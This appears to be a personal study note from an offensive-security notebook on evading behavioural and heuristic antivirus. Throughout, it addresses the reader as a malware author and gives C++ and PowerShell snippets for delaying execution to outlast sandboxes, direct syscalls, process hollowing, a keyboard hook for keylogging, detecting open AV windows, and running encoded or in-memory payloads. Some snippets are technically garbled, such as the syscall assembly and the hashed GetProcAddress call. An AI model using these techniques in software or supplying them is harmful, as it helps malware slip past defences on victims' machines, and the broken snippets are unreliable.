# Index 
- [[4. Bypassing Antivirus (AV)]]
	- [[4.1 Static Analysis Evasion]]
	- [[4.2 Behavioral and Heuristic Evasion]]
	- [[4.3 Anti-Analysis Techniques]]

# Delayed Execution
Behavioral AV systems often analyze programs in a sandbox for a limited amount of time (usually a few seconds or minutes) before assuming the file is clean. Delaying malicious activities can help your malware outlast the sandbox, preventing its suspicious behavior from being detected.

#### Techniques for Delayed Execution
- Simple Sleep Function: 
  The easiest way to introduce a delay is by using `Sleep()` in C++. By waiting for a certain period, the malware avoids triggering AV detections until after the sandbox has finished its analysis.

  ```cpp
  #include <Windows.h>

  int main() {
      Sleep(30000);  // Sleep for 30 seconds
      // Malicious activity after delay
      return 0;
  }
  ```
  This method is simple but can be detected by AVs that monitor for long periods of sleep calls.

- Progressive Sleep or Delays: 
  Instead of a fixed delay, you can introduce small incremental delays or conditions that get progressively longer as time goes on. This makes it harder for heuristic analysis to catch the malware within the sandbox time limits.

  ```cpp
  #include <Windows.h>

  int progressive_delay() {
      int delay = 1000;  // Start with 1 second
      for (int i = 0; i < 10; ++i) {
          Sleep(delay);
          delay *= 2;  // Double the delay with each iteration
      }
      return 0;
  }
  ```

- User Interaction as a Trigger: 
  Sandboxes typically do not simulate user interaction (e.g., mouse clicks or keystrokes). You can wait for specific user actions before executing the payload, which will prevent detection by sandboxes that are non-interactive.

  ```cpp
  #include <Windows.h>
  #include <iostream>

  void wait_for_user_input() {
      printf("Waiting for user interaction...\n");
      while (true) {
          if (GetAsyncKeyState(VK_SPACE)) {
              break;  // Trigger on space key press
          }
          Sleep(1000);  // Check every second
      }
      printf("User interaction detected!\n");
  }
  ```

- Time-based Triggers: 
  Malware can wait until a specific time of day or date to execute. This could be based on the system clock or online time servers. This method works particularly well if the sandbox doesn't monitor malware long enough to see this trigger happen.

  ```cpp
  SYSTEMTIME st;
  GetLocalTime(&st);
  if (st.wHour == 3) { // Trigger only at 3 AM
      // Malicious action here
  }
  ```

# Avoid Suspicious API Calls
Many heuristic-based AVs monitor API calls to flag potentially malicious activity. Certain Windows API functions are inherently suspicious, and frequent use of them can trigger AV alarms. For example:
- `CreateRemoteThread` and `WriteProcessMemory` are used in process injection.
- `VirtualAllocEx` is often used to allocate memory in other processes.

#### Techniques to Evade Suspicious API Calls

- Direct System Calls (Syscalls):
  Instead of using the Windows API directly, you can invoke syscalls to avoid using common API functions that AV systems monitor. By directly invoking system calls, you can bypass the higher-level API that AVs often hook into. 

  Example:
  ```cpp
  // Inline assembly to make system call for memory allocation
  __asm {
      mov eax, 0x18  // NtAllocateVirtualMemory syscall number on Windows
      call syscall   // Invoke the system call
  }
  ```

  Instead of relying on functions like `CreateRemoteThread()`, use `NtCreateThreadEx` directly to avoid AV detection.

- Use Native API Calls:
  Native API calls, such as those provided by Ntdll.dll, are lower-level than WinAPI functions and tend to bypass AV hooks. For instance, instead of `CreateFile`, use `NtCreateFile`, which doesn’t go through the higher-level libraries that AVs monitor.

- Function Hashing:
  Rather than using string-based function names, malware can use hashes of function names, which are dynamically resolved at runtime. This helps evade static and behavioral analysis by not having any readable API strings.

  Example:
  ```cpp
  HMODULE hModule = LoadLibrary("kernel32.dll");
  FARPROC pFunc = GetProcAddress(hModule, (char*)0x1A3B2C4);  // Hash of "CreateProcessA"
  ```

# Use Trusted Processes
Injecting your malicious code into trusted system processes is a great way to bypass detection. Many AV systems are more lenient towards processes that belong to Windows or signed executables.

#### Techniques for Process Injection and Hijacking

- Process Hollowing:
  Process hollowing is a technique where a legitimate process (like `notepad.exe`) is started in a suspended state, and its memory is replaced with the malware’s code. This allows the malware to run in the context of a trusted process, bypassing AV behavioral analysis.

  Steps:
  1. Start a legitimate process in a suspended state.
  2. Unmap the original code from the process using `NtUnmapViewOfSection()`.
  3. Inject your own code into the process's memory space using `WriteProcessMemory()`.
  4. Resume the process so that it runs your code.

  Example:
  ```cpp
  STARTUPINFO si = { 0 };
  PROCESS_INFORMATION pi = { 0 };

  if (CreateProcess(L"notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
      // Unmap original executable from process memory
      NtUnmapViewOfSection(pi.hProcess, baseAddress);

      // Inject malicious payload
      WriteProcessMemory(pi.hProcess, baseAddress, malwarePayload, payloadSize, NULL);

      // Resume process
      ResumeThread(pi.hThread);
  }
  ```

- DLL Injection:
  This is another technique where you force a legitimate process to load a malicious DLL. The simplest way to inject a DLL is by using `CreateRemoteThread()`, but it is heavily monitored by AVs.

  A better approach is reflective DLL injection, where the DLL is injected directly into the process’s memory without using the Windows loader. This technique loads the DLL from memory, avoiding suspicious API calls.

- Code Caves in Trusted Processes:
  Instead of injecting a new process or DLL, malware can use code caves in trusted processes. Code caves are unused spaces in the memory of running processes where malicious code can be written and executed without alerting AVs.

# Legitimate API Misuse
Rather than using commonly monitored APIs, you can take advantage of legitimate API calls in unexpected ways to achieve malicious purposes while flying under the radar.

#### Techniques for Legitimate API Misuse

- `SetWindowsHookEx` for Keylogging:
  Normally used for installing a hook procedure to monitor input events, this API can also be abused for keylogging. This avoids the need for suspicious process injections or direct access to keyboard APIs.

  ```cpp
  HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
  ```

- `NtQuerySystemInformation` for Reconnaissance:
  Instead of using suspicious API calls like `EnumProcesses` or `EnumWindows`, you can use lower-level native APIs like `NtQuerySystemInformation` to gather system information without raising red flags. This API provides detailed information about the system, including running processes, loaded drivers, and memory usage.

  Example to enumerate processes:
  ```cpp
  SYSTEM_PROCESS_INFORMATION* spi;
  NtQuerySystemInformation(SystemProcessInformation, spi, bufferSize, NULL);
  ```

- `FindWindow` to Avoid Detection:
  Instead of directly interacting with AV processes or services (which is often flagged), you can use `FindWindow()` or `EnumWindows()` to check if an AV window is open. If it is, you can choose to exit or delay malicious activity.

  ```cpp
  HWND hwnd = FindWindow(NULL, L"Antivirus Window Name");
  if (hwnd != NULL) {
      // AV is running, abort or delay
      exit(0);
  }
  ```

# Use Fileless Techniques
One of the most effective ways to evade behavioral detection is by avoiding the file system entirely. This is known as fileless malware, where the malicious code is executed entirely in memory. By never touching the disk, you eliminate a major source of AV detection.

#### Techniques for Fileless Execution

- Reflective DLL Injection:
  Load a malicious DLL from memory without writing it to disk. This method avoids leaving a detectable file footprint and ensures the payload exists only in memory during execution.

- PowerShell Exploitation:
  PowerShell scripts can be used to execute code in memory and avoid dropping executables onto the disk.

 Since many organizations use PowerShell for legitimate administrative tasks, it can also bypass AV.

  Example:
  ```powershell
  powershell.exe -nop -w hidden -e <Base64 encoded script>
  ```

- Memory-only Execution:
  Use tools like `VirtualAlloc` and `WriteProcessMemory` to load and execute code directly into memory without saving any malicious payloads to disk. This can be combined with encryption to further hide the payload from AV monitoring memory for suspicious content.

  Example:
  ```cpp
  LPVOID exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy(exec_mem, payload, payload_len);
  ((void(*)())exec_mem)();  // Execute payload in memory
  ```
